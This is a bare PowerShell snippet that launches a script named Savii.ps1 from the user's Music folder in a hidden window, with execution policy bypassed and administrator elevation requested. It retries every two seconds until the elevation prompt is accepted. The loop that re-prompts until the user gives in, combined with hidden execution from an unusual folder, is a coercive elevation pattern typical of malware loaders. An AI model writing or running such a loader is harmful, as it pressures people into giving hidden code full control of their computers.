do {
    try {
        $scriptPath = Join-Path ([Environment]::GetFolderPath("Music")) "Savii.ps1"
        if (Test-Path $scriptPath) {
            Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
            $success = $true
        } else {
            Write-Host "Script not found at: $scriptPath" -ForegroundColor Red
            $success = $false
            Start-Sleep -Seconds 2
        }
    } catch {
        Write-Host "Error: $_" -ForegroundColor Red
        $success = $false
        Start-Sleep -Seconds 2
    }
} until ($success)
